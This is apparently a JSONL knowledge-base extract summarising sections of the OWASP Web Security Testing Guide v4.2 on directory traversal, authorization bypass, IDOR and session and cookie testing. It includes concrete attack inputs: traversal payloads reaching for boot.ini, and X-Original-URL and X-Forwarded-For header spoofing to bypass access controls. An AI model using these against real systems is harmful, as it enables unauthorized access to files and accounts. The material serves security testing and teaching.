{"id": "kb-000723", "section": null, "tags": ["PATH"], "source": "wstg-v4.2.pdf", "text": "Key examples of directory traversal payloads for testing include: 'file=....//....//boot.ini', 'file=....\\....\\boot.ini', and 'file= ..\\..\\boot.ini'. These attempts exploit the software's handling of file paths to access unauthorized files or directories. Tools recommended for conducting directory traversal testing include: - DotDotPwn: A specialized fuzzer for testing directory traversal attacks. - OWASP ZAP: An open-source web application security scanner. - Burp Suite: A widely used suite of tools for web application security testing. The document suggests using encoding/decoding tools and a string searcher like 'grep' to aid in the testing process. DirBuster is also mentioned as a tool for brute-forcing directories and files to find vulnerable points in web applications."}
{"id": "kb-000724", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "The test focuses on verifying the implementation of the authorization schema for roles or privileges related to accessing reserved functions and resources."}
{"id": "kb-000725", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "Key objectives include determining if unauthorized access is possible after logout, or if a user can access resources or functions meant for users with different roles. Horizontal access testing checks if one user with a specific role can access resources of another user with the same role. Vertical access testing examines whether users can access administrative functions if they are logged in as non-admins."}
{"id": "kb-000726", "section": null, "tags": ["AUTHZ", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Steps for horizontal testing include generating two users with identical privileges, maintaining two sessions, and changing session identifiers to monitor responses."}
{"id": "kb-000727", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "An application is deemed vulnerable if users with the same role can access identical resources or perform operations on others' resources, indicated by consistent responses or shared private data in queries."}
{"id": "kb-000728", "section": null, "tags": ["HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "The HTTP request generated for viewing settings in a web application includes fields for session IDs, usernames, and other HTTP headers, illustrating the structure of requests involved in web security testing."}
{"id": "kb-000729", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "An example of a valid and legitimate response structure for an HTTP POST includes a JSON object containing user details, which highlights the type of data accessed during requests."}
{"id": "kb-000730", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "An attacker can exploit vulnerabilities in the application by attempting to execute requests with a different session identifier, potentially gaining access to another user's data, demonstrating a risk for lateral movement attacks."}
{"id": "kb-000731", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "Vertical authorization bypass is a security concern where an attacker could gain access to functions or data meant for users with higher privileges. Testing involves checking if a lower-privileged user can access resources or execute functions reserved for higher-privileged roles."}
{"id": "kb-000732", "section": null, "tags": ["AUTHZ", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Testing steps for vertical authorization bypass involve registering multiple users, maintaining separate sessions for distinct roles, altering session identifiers to test resource access, and confirming that weak sessions cannot access sensitive data or functionalities intended for higher roles."}
{"id": "kb-000733", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "A banking site's role structure typically has specific permissions assigned to each role concerning functionalities, which is critical for determining the security posture associated with each user type."}
{"id": "kb-000734", "section": null, "tags": ["AUTHZ", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Roles and permissions in an application are classified as follows: Administrator (Full Control, Delete), Manager (Modify, Add, Read), Staff (Read, Modify), and Customer (Read Only)."}
{"id": "kb-000735", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "An application is vulnerable if users can access functions beyond their assigned roles, specifically if: Customers can perform Administrator, Manager, or Staff tasks; Staff can perform Manager or Administrator tasks; Managers can perform Administrator tasks."}
{"id": "kb-000736", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "Example of a vulnerability: access to the deleteEvent function, typically reserved for administrators, by users in lower roles. The URL for accessing this function is https://www.example.com/account/deleteEvent."}
{"id": "kb-000737", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "An example HTTP request for an administrator accessing the deleteEvent function: POST /account/deleteEvent HTTP/1.1 . The expected response for a successful event deletion would be HTTP/1.1 200 OK and JSON message {\"message\": \"Event was deleted\"}."}
{"id": "kb-000738", "section": null, "tags": ["AUTHZ", "HTTP"], "source": "wstg-v4.2.pdf", "text": "If a lower-privileged user (like a Customer) can replicate the HTTP request and receive the same success message, it demonstrates a critical security vulnerability in the application."}
{"id": "kb-000739", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "It's highlighted that authorization validation is sometimes performed only at the GUI level, leaving backend functions inadequately secured, which can lead to access vulnerabilities."}
{"id": "kb-000740", "section": null, "tags": ["AUTHZ", "HTTP"], "source": "wstg-v4.2.pdf", "text": "The addUser function is part of an administrative menu in a web application, accessed via a specific URL (e.g., https://www.example.com/admin/addUser). When calling the addUser function, an HTTP POST request is generated that includes parameters such as userID, role, and group."}
{"id": "kb-000741", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "It is important to test what happens if a non-administrative user tries to execute requests designed for the administrative context. Questions to consider include: Will a non-admin user be able to create a new user? If so, what privileges would the new user have?"}
{"id": "kb-000742", "section": null, "tags": ["API", "AUTHZ"], "source": "wstg-v4.2.pdf", "text": "Web applications often set up resource controls based on user roles. For example, resumes uploaded to a restricted location (like an S3 bucket) should not be accessible by non-authorized users. Testing involves trying to access these resources to ensure proper restrictions are in place."}
{"id": "kb-000743", "section": null, "tags": ["API", "AUTHZ"], "source": "wstg-v4.2.pdf", "text": "Applications may support custom headers like X-Original-URL or X-Rewrite-URL to override the target URL in requests. This can be exploited if access control is based solely on the request URL, potentially allowing unauthorized users to bypass restrictions."}
{"id": "kb-000744", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "A method to detect support for these headers involves sending requests without these headers and then sending additional requests with those headers pointing to non-existing resources to see if the application behaves differently."}
{"id": "kb-000745", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "HTTP response status code 404 indicates that the resource was not found, which can suggest that the application supports special request headers like X-Original-URL or X-Rewrite-URL."}
{"id": "kb-000746", "section": null, "tags": ["API", "AUTHZ"], "source": "wstg-v4.2.pdf", "text": "To attempt a bypass against access control restrictions, send a request using a URL allowed by the front-end component, while specifying the real target URL in either the X-Original-URL or X-Rewrite-URL header, depending on which is supported."}
{"id": "kb-000747", "section": null, "tags": ["API", "AUTHZ"], "source": "wstg-v4.2.pdf", "text": "If both X-Original-URL and X-Rewrite-URL are supported, test each one to identify which effectively bypasses the access control restrictions."}
{"id": "kb-000748", "section": null, "tags": ["API", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Administrative functionalities might be restricted to local networks, making it possible to abuse proxy or forwarding-related HTTP headers for unauthorized access. Headers that might be tested include: X-Forwarded-For, X-Forward-For, X-Remote-IP, X-Originating-IP, X-Remote-Addr, and X-Client-IP."}
{"id": "kb-000749", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "Test values for these headers could include local addresses such as 127.0.0.1, localhost, any RFC1918 address (e.g., 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16), or link-local addresses (e.g., 169.254.0.0/16). Including a port in the address (e.g., 127.0.0.4:80) may help bypass protections from web application firewalls. Remediation includes employing least privilege principles for users, roles, and resources to ensure no unauthorized access occurs."}
{"id": "kb-000750", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "Tools mentioned for security testing include OWASP Zed Attack Proxy (ZAP), Port Swigger Burp Suite, along with respective extensions such as AuthMatrix and Autorize. Privilege escalation can occur when a user gains access to more resources than intended, often due to flaws in the application."}
{"id": "kb-000751", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "Vertical escalation refers to accessing resources granted to more privileged accounts, while horizontal escalation allows access to similarly configured accounts. The testing phase should verify that users cannot modify their privileges or roles in a way that permits privilege escalation attacks. Testing should identify injection points that can manipulate privileges and attempt to bypass security measures."}
{"id": "kb-000752", "section": null, "tags": ["AUTHZ", "HTTP"], "source": "wstg-v4.2.pdf", "text": "In testing for role/privilege manipulation, every part of the application where users can create, receive, or delete information should be recorded and tested across user roles."}
{"id": "kb-000753", "section": null, "tags": ["AUTHZ", "HTTP"], "source": "wstg-v4.2.pdf", "text": "An example of privilege manipulation is illustrated with an HTTP POST request where a user attempts to change the `groupID` parameter to access another user's order."}
{"id": "kb-000754", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "Manipulation of User Profile: In web security testing, if testers modify the hidden field value in a server response (such as 'profile' from 'SysAdmin'), it can potentially allow unauthorized privilege escalation, such as gaining administrative access."}
{"id": "kb-000755", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Manipulation of Condition Value: Testers should be cautious about servers that trust user-supplied values implicitly. For example, changing a parameter value like 'PVValid' from -1 to 0 may bypass error conditions and allow unauthorized access, demonstrating the importance of verifying input validation mechanisms."}
{"id": "kb-000756", "section": null, "tags": ["API"], "source": "wstg-v4.2.pdf", "text": "Manipulation of IP Address: Websites that restrict access based on IP address, such as using 'X-Forwarded-For', might be vulnerable if an attacker can modify this header value. This highlights the need for effective IP filtering strategies to prevent unauthorized access."}
{"id": "kb-000757", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "URL Traversal: Security testers should check for vulnerabilities in authorization checks by attempting to access unauthorized pages directly, which may be possible if adequate checks are not enforced."}
{"id": "kb-000758", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "URL authorization checks based only on partial URL match can be circumvented through URL encoding techniques, leading to security vulnerabilities."}
{"id": "kb-000759", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Common methods that can be exploited include functions like startswith(), endswith(), contains(), and indexOf() which may indicate insufficient checks on URL parameters."}
{"id": "kb-000760", "section": null, "tags": ["AUTHN", "CRYPTO", "SESSION"], "source": "wstg-v4.2.pdf", "text": "A weak session ID, particularly one generated with a simple algorithm such as MD5(Password + UserID), is susceptible to brute force attacks, allowing attackers to predict or generate valid session IDs for unauthorized access."}
{"id": "kb-000761", "section": null, "tags": ["AUTHZ", "HTTP", "IDOR"], "source": "wstg-v4.2.pdf", "text": "Insecure Direct Object References (IDOR) occur when an application provides direct access to objects based on user-supplied input. Attackers can take advantage of IDOR vulnerabilities to bypass authorization and gain direct access to resources in a system, such as database records or files."}
{"id": "kb-000762", "section": null, "tags": ["AUTHZ", "HTTP", "IDOR"], "source": "wstg-v4.2.pdf", "text": "The main cause of IDOR is insufficient authorization checks applied to user-supplied input. This allows unauthorized users to modify parameters used to access objects, leading to unauthorized access."}
{"id": "kb-000763", "section": null, "tags": ["AUTHZ", "IDOR"], "source": "wstg-v4.2.pdf", "text": "Test objectives for identifying IDOR vulnerabilities include: 1) Identifying points where object references may occur, and 2) Assessing access control measures to see if they are vulnerable to IDOR."}
{"id": "kb-000764", "section": null, "tags": ["HTTP", "IDOR"], "source": "wstg-v4.2.pdf", "text": "Testing for IDOR vulnerabilities involves mapping out all locations in the application where user input is used to reference objects directly. This can include direct access to database rows, files, and application pages."}
{"id": "kb-000765", "section": null, "tags": ["AUTHZ", "IDOR"], "source": "wstg-v4.2.pdf", "text": "To effectively test for IDOR vulnerabilities, testers should ideally have multiple users with different objects and privileges to verify if direct object references are present in application functionality."}
{"id": "kb-000766", "section": null, "tags": ["HTTP", "IDOR"], "source": "wstg-v4.2.pdf", "text": "A typical testing scenario includes observing the value of a parameter that is directly used to retrieve a database record, such as an invoice ID in a URL: http://foo.bar/somepage?invoice=12345. If the invoice ID is used directly in the database query, altering this value could allow access to any invoice regardless of user ownership, demonstrating IDOR vulnerability."}
{"id": "kb-000767", "section": null, "tags": ["IDOR"], "source": "wstg-v4.2.pdf", "text": "In testing, if a tester can access objects belonging to different users by manipulating parameter values, this confirms a vulnerability in the system based on IDOR."}
{"id": "kb-000768", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "In web applications, parameters in URLs can allow users to perform actions such as changing passwords, where the application directly uses the values provided to identify the user or resource involved. This can create vulnerabilities."}
{"id": "kb-000769", "section": null, "tags": ["AUTHN", "AUTHZ", "HTTP"], "source": "wstg-v4.2.pdf", "text": "For instance, the 'user' parameter in the URL 'http://foo.bar/changepassword?user=someuser' can potentially be manipulated to change the password of another user by providing an unauthorized username, which indicates a lack of proper authorization checks."}
{"id": "kb-000770", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "An example of a vulnerability where a user can access unauthorized files is depicted in the URL 'http://foo.bar/showImage?img=img00011'. If an attacker modifies the 'img' parameter to another value, they could access files that they shouldn't be able to, which is a common issue seen with improper access controls."}
{"id": "kb-000771", "section": null, "tags": ["API", "AUTHZ", "HTTP"], "source": "wstg-v4.2.pdf", "text": "The access to application functionality can be tested by observing how parameters affect user permissions. Using 'menuitem' parameter in the URL 'http://foo.bar/accessPage?menuitem=12', if the user has access restricted to certain menu items, altering this parameter could lead to unauthorized access to other functionalities of the application, indicating weaknesses in the application's access controls and authorization checks."}
{"id": "kb-000772", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Parameter manipulation is key in identifying vulnerabilities, and proper testing should account for this by attempting different values to see if the application behavior may expose sensitive functionality or data."}
{"id": "kb-000773", "section": null, "tags": ["AUTHN", "SESSION"], "source": "wstg-v4.2.pdf", "text": "**Session Management**: A mechanism used by web applications to maintain the state of a user across multiple requests, avoiding the need for continuous authentication."}
{"id": "kb-000774", "section": null, "tags": ["AUTHZ", "SESSION"], "source": "wstg-v4.2.pdf", "text": "**Importance of Cookies**: Cookies are used to store session tokens and thus play a crucial role in web security by preserving user identity and other relevant information during a session."}
{"id": "kb-000775", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "**RFC 2965**: Refers to the specification detailing how cookies should work within web applications, providing guidelines for their functionality."}
{"id": "kb-000776", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "**Example of Session Management**: An online shopping cart that tracks user identity, profile, chosen products, prices, and discounts throughout the shopping session is an example of effective session management using cookies."}
{"id": "kb-000777", "section": null, "tags": ["AUTHZ", "SESSION"], "source": "wstg-v4.2.pdf", "text": "**Cookie Security Risks**: Weak session token generation can lead to unauthorized access through session hijacking. Tampering with cookies may allow attackers to gain higher privileges and change operations within the application."}
{"id": "kb-000778", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "**Attack Steps**: 1) Cookie collection, 2) Cookie reverse engineering, 3) Cookie manipulation. These steps indicate the methodology attackers might use to forge valid session tokens."}
{"id": "kb-000779", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "**Cookie Overflow Attack**: A distinct attack pattern that targets memory overflow rather than recreating valid cookies. The goal here is to manipulate application behavior, potentially leading to remote code execution."}
{"id": "kb-000780", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "**Test Objectives**: The tester aims to gather session tokens, ensure randomness in token generation to thwart forgery, and manipulate unsigned cookies to test for vulnerabilities."}
{"id": "kb-000781", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Black-box testing involves evaluating how an application interacts with client requests without access to the internal structure or workings of the application."}
{"id": "kb-000782", "section": null, "tags": ["CRYPTO", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Important cookie-related criteria that need to be tested include whether Set-Cookie directives are tagged as Secure, whether any cookie operations occur over unencrypted transport, and how the application manages security in these scenarios."}
{"id": "kb-000783", "section": null, "tags": ["HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Testers should assess if cookies are persistent or transient, examining the expiration times on persistent cookies to ensure they are reasonable. Key HTTP/1.1 and HTTP/1.0 Cache-Control settings should be reviewed to evaluate their effectiveness in protecting cookies."}
{"id": "kb-000784", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "A crucial element of cookie manipulation involves understanding how cookies are created and managed by the application, identifying the number of cookies used and the events that generate or modify them."}
{"id": "kb-000785", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Creating a spreadsheet to map each cookie to the relevant parts of the application can be a valuable tool for testing and identifying where cookies are necessary."}
{"id": "kb-000786", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Session analysis requires examining session tokens (such as cookies or Session IDs) for properties like randomness, uniqueness, and resistance to statistical and cryptographic attacks."}
{"id": "kb-000787", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "It's important to analyze the structure and content of session tokens to avoid security issues like including identifiable data in clear-text, which can lead to information leakage."}
{"id": "kb-000788", "section": null, "tags": ["CRYPTO"], "source": "wstg-v4.2.pdf", "text": "Tokens can be encoded or hashed, but testers should verify that this is not simply an obfuscation technique by comparing tokens against standard encoding, like Hex or Base64."}
{"id": "kb-000789", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Identifying the type of obfuscation in data can lead to the possibility of decoding back to the original data, although it may not always be feasible. It can be beneficial to enumerate the encoding based on the message format. Automated brute-force attacks can be devised if both the format and obfuscation technique are known."}
{"id": "kb-000790", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Hybrid tokens in web security might combine fixed information, like an IP address or User ID, with encoded data, which could look something like 'owaspuser:192.168.100.1:a7656fafe94dae72b1e1487670148412'."}
{"id": "kb-000791", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Analyzing session tokens should involve examining for patterns; for example, a 32-bit token could consist of 16 bits of static data (e.g., username or IP address) and 16 bits of variable data, where variability indicates how frequently or sequentially the token may change."}
{"id": "kb-000792", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Further testing of session ID structures should focus on identifying static parts of the session ID, any clear-text confidential information it stores (e.g. usernames or IP addresses), and the overall structure to determine potential security weaknesses."}
{"id": "kb-000793", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Key questions during session ID testing include: What portions of the ID remain static across user sessions? What confidential data is easily decoded or deduced from the session IDs? What patterns emerge in the session IDs that could suggest predictable security vulnerabilities?"}
{"id": "kb-000794", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "The randomness and predictability of Session IDs are critical for security; analyzing their variable areas for recognizable patterns is essential. Users should utilize both manual methods and statistical tools to detect such patterns."}
{"id": "kb-000795", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Sample collection for analysis should be rigorously controlled, factoring in identical login conditions and timeframe while prioritizing high numbers of simultaneous connections to reduce variance. Even time intervals as small as 50ms can affect the analysis."}
{"id": "kb-000796", "section": null, "tags": ["CLIENT", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Incremental nature of variable elements in session IDs should be explored, especially those related to absolute or elapsed time. Systems often use time as a seed for generating pseudorandom elements, which can introduce recognizable patterns."}
{"id": "kb-000797", "section": null, "tags": ["HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "The reproducibility of session IDs under the same input conditions is important for assessing security. Session IDs must be resistant to statistical or cryptanalytic attacks, and any links between session IDs and time must be clearly understood. Session IDs can possess predictable portions, making them vulnerable to attacks. Key characteristics of secure cookies:"}
{"id": "kb-000798", "section": null, "tags": ["CLIENT", "SESSION"], "source": "wstg-v4.2.pdf", "text": "1. **Unpredictability**: Cookies should contain hard-to-guess data to prevent session hijacking. Random values or cryptography are recommended to enhance unpredictability."}
{"id": "kb-000799", "section": null, "tags": ["CRYPTO", "SESSION"], "source": "wstg-v4.2.pdf", "text": "2. **Tamper resistance**: Cookies must be resistant to modification. For example, if a cookie reads `IsAdmin=No`, it should be encrypted or hashed to prevent tampering that could allow unauthorized access."}
{"id": "kb-000800", "section": null, "tags": ["CRYPTO", "SESSION"], "source": "wstg-v4.2.pdf", "text": "3. **Expiration**: Critical cookies should expire after a certain time to reduce risks of reuse in session replay attacks. Non-critical cookies that store preferences may not require such stringent expiration. 4. **Secure flag**: Critical cookies must be transmitted only over encrypted channels to protect against eavesdropping."}
{"id": "kb-000801", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "The methodology for cookie analysis involves collecting numerous cookie instances to identify patterns, which may range from a few samples for easily breakable cookies to thousands for more complex scenarios. Documenting the specific time each cookie is obtained is crucial, especially if server timestamps influence cookie values."}
{"id": "kb-000802", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Analysts should manipulate cookie values and observe how the application processes them. Varying one aspect of a cookie while keeping others constant can yield insights into the cookie's structure."}
{"id": "kb-000803", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Examples of analysis can include: determining character sets used in cookies, checking types (numeric, alphanumeric, hexadecimal), and exploring the composition and delimiters of different parts of structured cookies. An example of a cookie structure is `ID=5a0acfc7ffeb919:CR=1:TM=1120514521:LM=1120514521:S=j3am5KzC4v01ba3q`."}
{"id": "kb-000804", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "The structure of session data often includes fields carrying different types of data: ID (hexadecimal), CR (small integer), TM and LM (large integers), and S (alphanumeric)."}
{"id": "kb-000805", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Brute force attacks are influenced by the predictability and randomness of session IDs, and a smaller variance coupled with long validity increases the success rate of such attacks. A long session ID with high variance and shorter validity makes it harder for brute force attacks to succeed."}
{"id": "kb-000806", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "It is crucial to analyze if the session ID space is large enough to prevent brute forcing, considering the length of the key in comparison to its lifespan. Delays between connection attempts for different session IDs can mitigate the risks of brute force attacks."}
{"id": "kb-000807", "section": null, "tags": ["CONF", "SESSION"], "source": "wstg-v4.2.pdf", "text": "In gray-box testing, testers analyze session management schemas for attributes such as the predictability of the session ID, token length, session timeout, and cookie configurations."}
{"id": "kb-000808", "section": null, "tags": ["CLIENT", "CRYPTO", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Random session tokens should not be easily predictable, and the use of cryptographic algorithms with key lengths of at least 256 bits (e.g., AES) is encouraged. Session IDs should be at least 50 characters in length to enhance security."}
{"id": "kb-000809", "section": null, "tags": ["CONF", "HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Defined session timeouts should align with the criticality of the application’s managed data, and cookie configurations should ensure they are secure, persistent only in RAM (non-persistent), and HTTPOnly to prevent access by scripts. Tools for testing session management include OWASP Zed Attack Proxy (ZAP), Burp Sequencer, and YEHG’s JHijack. Web cookies are key attack vectors for malicious users and require protection from attacks. HTTP is a stateless protocol, necessitating the use of sessions to manage state across requests. Cookies are commonly used for session management, personalization, and tracking within web applications. To secure cookie data, various protection mechanisms are implemented, including cookie attributes and prefixes."}
{"id": "kb-000810", "section": null, "tags": ["CRYPTO", "SESSION"], "source": "wstg-v4.2.pdf", "text": "The Secure attribute ensures cookies are only sent over secure channels (e.g., HTTPS), protecting them from being sent in unencrypted requests."}
{"id": "kb-000811", "section": null, "tags": ["CLIENT", "SESSION"], "source": "wstg-v4.2.pdf", "text": "The HttpOnly attribute prevents cookies from being accessed via client-side scripts (like JavaScript), mitigating the risk of session leakage."}
{"id": "kb-000812", "section": null, "tags": ["XSS"], "source": "wstg-v4.2.pdf", "text": "Cross-Site Scripting (XSS) attacks can still occur when attackers send requests in place of the user, but certain attributes like Domain and Path can limit the reach of these attacks significantly."}
{"id": "kb-000813", "section": null, "tags": ["API", "SESSION"], "source": "wstg-v4.2.pdf", "text": "The Domain attribute restricts which domains can set cookies. Only hosts belonging to the specified domain can set a cookie for that domain, and it cannot be a top-level domain like .com or .gov to prevent arbitrary cookie setting for another domain."}
{"id": "kb-000814", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "A cookie set without a Domain attribute uses the hostname of the server generating the cookie as its default domain value. For example, a cookie for app.mydomain.com will not be sent to otherapp.mydomain.com if no domain attribute is set."}
{"id": "kb-000815", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Setting a Domain attribute too broadly (e.g., mydomain.com) can lead to vulnerabilities where other subdomains (like otherapp.mydomain.com) can access sensitive cookies like session tokens."}
{"id": "kb-000816", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "The Path attribute specifies the URL path for which the cookie is valid. If set too broadly, application cookies can leak to other applications on the same server if they are all under a common path (e.g., path=/)."}
{"id": "kb-000817", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "The Expires attribute is used to set the lifespan of a cookie, turning it into a persistent cookie or forcefully deleting it by setting it to a past date. Persistent cookies remain until the specified expiration date."}
{"id": "kb-000818", "section": null, "tags": ["CONF", "CSRF", "SESSION"], "source": "wstg-v4.2.pdf", "text": "The SameSite attribute can mitigate risks from cross-origin information leakage and can help protect against cross-site request forgery (CSRF) attacks. It has three configurations: Strict, Lax, and None."}
{"id": "kb-000819", "section": null, "tags": ["API", "SESSION"], "source": "wstg-v4.2.pdf", "text": "The Strict value is the most restrictive usage of SameSite, allowing cookies to be sent only to first-party contexts, ensuring enhanced privacy."}
{"id": "kb-000820", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "The Lax value allows cookies to be sent to first-party URLs even from third-party domains, improving user experience, and is often considered the default behavior by browsers."}
{"id": "kb-000821", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "The None value allows cookies to be sent on cross-site requests only if it's used in conjunction with the Secure attribute, reinforcing security by mandating secure transmission."}
{"id": "kb-000822", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Cookies do not inherently guarantee integrity and confidentiality, leading to the development of Cookie Name Prefixes to embed security features within cookie names."}
{"id": "kb-000823", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Host Prefix (__Host-) requires strict conditions: set with Secure attribute, sent from a secure URI, should not include a Domain attribute, and must have a Path attribute set to /."}
{"id": "kb-000824", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Secure Prefix (__Secure-) allows cookies to ensure they are set with the Secure attribute and are sent from secure URIs, enhancing security protocols for cookies."}
{"id": "kb-000825", "section": null, "tags": ["AUTHN", "CONF", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Best practices suggest securing cookie configurations to enhance security, exemplified in defining the most secure cookie configuration as Set-Cookie: __Host-SID=<session token>; path=/; Secure; HttpOnly; SameSite=Strict. Session fixation is a security vulnerability that occurs when the same session cookie is preserved before and after user authentication. Session cookies can be exploited by attackers to impersonate users if the cookies are not refreshed after login."}
{"id": "kb-000826", "section": null, "tags": ["AUTHN", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Attackers can obtain session cookies even without authenticating themselves by using specific techniques to inject these cookies into the victim's browser."}
{"id": "kb-000827", "section": null, "tags": ["AUTHN", "SESSION"], "source": "wstg-v4.2.pdf", "text": "To mitigate session fixation, session cookies should be refreshed after authentication, ensuring that the old session cookies are not valid post-login."}
{"id": "kb-000828", "section": null, "tags": ["HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Another preventative measure against session fixation is to ensure the integrity of session cookies, such as using strict security measures like HSTS (HTTP Strict Transport Security) or modifying cookie names with __Host- or __Secure- prefixes."}
{"id": "kb-000829", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Full HSTS adoption means enabling HSTS for a domain and all its subdomains, which adds a layer of security against session fixation vulnerabilities."}
{"id": "kb-000830", "section": null, "tags": ["AUTHN", "SESSION"], "source": "wstg-v4.2.pdf", "text": "The testing process for session fixation includes analyzing the authentication mechanism and evaluating the impact of cookie handling during this process. The application assigns a new session identifier (JSESSIONID) for the client after the initial request."}
{"id": "kb-000831", "section": null, "tags": ["AUTHN", "SESSION"], "source": "wstg-v4.2.pdf", "text": "If the tester successfully logs in using a POST request with credentials, but does not receive a new cookie upon successful authentication, this indicates a vulnerability to session hijacking."}
{"id": "kb-000832", "section": null, "tags": ["AUTHZ", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Session hijacking can occur if an attacker tricks a user into revealing their session identifier, allowing the attacker to assume the user's privileges."}
{"id": "kb-000833", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "The testing strategy for 'Forced Cookies' assesses the vulnerability to session fixation by simulating an attack where the attacker presents cookies from the victim's session to access their account."}
{"id": "kb-000834", "section": null, "tags": ["HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Full HTTP Strict Transport Security (HSTS) protects against cookie hijacking by ensuring that all cookies have integrity, making this testing approach applicable only to sites without HSTS."}
{"id": "kb-000835", "section": null, "tags": ["AUTHN", "AUTHZ", "SESSION"], "source": "wstg-v4.2.pdf", "text": "The steps for executing a 'Forced Cookies' test include: capturing the cookie jar before user authentication, logging in as the victim, and attempting to use the captured cookies to gain access to privileged functions."}
{"id": "kb-000836", "section": null, "tags": ["CONF", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Successful execution means that the security configurations of the session management are inadequate, indicating a critical vulnerability that needs to be addressed."}
{"id": "kb-000837", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "The steps for testing session fixation vulnerabilities involve triggering a secure function, logging in as a victim, and observing results to determine attack success. A recommended practice for testing is to use two different machines or browsers to reduce false positives during the test."}
{"id": "kb-000838", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "An alternate testing strategy can simplify the process by using only one testing account, stopping at a certain step after logging in as the victim."}
{"id": "kb-000839", "section": null, "tags": ["AUTHN", "SESSION"], "source": "wstg-v4.2.pdf", "text": "To remediate session fixation vulnerabilities, applications should implement session token renewal after user authentication, invalidating the existing session ID before providing a new one. The OWASP ZAP is a tool recommended for conducting web security testing to identify vulnerabilities such as session fixation."}
